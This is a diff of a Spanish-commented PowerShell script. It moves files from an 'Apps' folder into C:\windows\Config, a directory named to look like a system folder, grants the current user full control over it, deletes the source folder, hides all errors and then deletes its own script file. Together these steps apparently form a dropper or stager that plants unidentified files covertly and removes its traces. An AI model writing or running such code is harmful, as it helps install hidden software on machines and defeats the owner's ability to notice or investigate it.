@@ -1,12 +1,31 @@
-# Crear la carpeta si no existe
-$carpeta = "C:\Windows\Testingo"
-if (!(Test-Path $carpeta)) {
-    New-Item -Path $carpeta -ItemType Directory -Force | Out-Null
+$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+$origenApps = Join-Path $scriptDir "Apps"
+$carpetaDestino = "C:\windows\Config"
+$scriptPath = $MyInvocation.MyCommand.Path
+
+try {
+    if (!(Test-Path $carpetaDestino)) {
+        New-Item -Path $carpetaDestino -ItemType Directory -Force | Out-Null
+    }
+
+    $usuario = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $acl = Get-Acl $carpetaDestino
+    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($usuario, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+    $acl.SetAccessRule($accessRule)
+    Set-Acl -Path $carpetaDestino -AclObject $acl
+
+    if (Test-Path $origenApps) {
+        Get-ChildItem -Path $origenApps -File | ForEach-Object {
+            Move-Item -Path $_.FullName -Destination $carpetaDestino -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Borrar la carpeta Apps después de mover todos los archivos
+        Remove-Item -Path $origenApps -Recurse -Force -ErrorAction SilentlyContinue
+    }
+} catch {
+    # Silencioso - no mostrar errores
 }
 
-# Otorgar permisos totales (Full Control) al grupo "Usuarios"
-icacls $carpeta /grant "Usuarios:(OI)(CI)F" /T > $null 2>&1
-
-# Autodestrucción del script PowerShell
-Start-Sleep -Seconds 1
-Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+# Autodestrucción del archivo PS1
+Start-Sleep -Seconds 2
+Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
